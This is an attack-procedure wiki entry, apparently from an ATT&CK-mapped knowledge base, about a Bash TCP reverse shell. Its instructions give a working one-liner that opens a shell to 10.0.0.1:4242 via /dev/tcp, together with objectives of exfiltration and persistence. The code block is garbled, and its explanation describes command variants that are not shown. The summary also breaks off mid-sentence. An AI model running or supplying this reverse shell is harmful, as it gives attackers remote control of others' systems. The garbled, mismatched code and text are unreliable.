---
id: 8b3ab7c2-f6cb-4ecb-b532-77e1cefc2d47
name: Bash TCP Reverse Shell Connection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.151515+00:00'
updated_at: '2023-04-10T20:25:28.088709+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Bash TCP]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Bash TCP Reverse Shell Connection

## Summary

A Bash TCP Reverse Shell Connection is a technique used by attackers to establish a remote shell on a compromised system. This technique involves creating a reverse shell connection from the target system to the attacker's system. Once the connection is established, the attacker can execute command

## Description

# Description

A Bash TCP Reverse Shell Connection is a technique used by attackers to establish a remote shell on a compromised system. This technique involves creating a reverse shell connection from the target system to the attacker's system. Once the connection is established, the attacker can execute commands and interact with the compromised system as if they were sitting in front of it. This technique is commonly used for post-exploitation activities, such as data exfiltration, lateral movement, and persistence.

To establish a Bash TCP Reverse Shell Connection, the attacker must first create a listener on their system. They can then execute a command on the target system that will initiate the reverse shell connection. Once the connection is established, the attacker can execute commands on the target system using the Bash shell.

The business value of this technique is that it allows attackers to gain unauthorized access to systems and steal sensitive data. This can result in financial loss, reputational damage, and legal liability for the targeted organization.

## Requirements

1. Access to the target system

1. Bash shell on the target system

1. Network connectivity between the target system and the attacker's system

## Defense

1. Implement network segmentation to limit the attacker's ability to move laterally

1. Monitor network traffic for signs of command and control activity

1. Implement strong authentication mechanisms to prevent unauthorized access to systems

## Objectives

1. Establish a reverse shell connection from a target system to an attacker's system

1. Execute commands and interact with the compromised system

1. Perform post-exploitation activities, such as data exfiltration, lateral movement, and persistence

# Instructions

1. To establish a reverse shell connection, run the following command in your terminal:

**Code**: [[bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exe]]

> This command creates a reverse shell connection to the IP address and port specified (10.0.0.1/4242). This allows an attacker to gain remote access to the target system. The command uses the bash shell to redirect input and output to the specified IP address and port. The '>&' operator redirects standard output to a file descriptor and '&1' redirects standard output to the same file descriptor. '0<&196' redirects standard input to file descriptor 196. 'exec 196<>/dev/tcp/10.0.0.1/4242' opens a TCP connection to the specified IP address and port using file descriptor 196. 'sh <&196 >&196 2>&196' runs a shell command with input and output redirected to file descriptor 196. Finally, '/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1' opens a new bash shell and redirects input and output to the specified IP address and port.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Remote Services|T1021 - Remote Services]]

## Tags

- [[Bash TCP]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
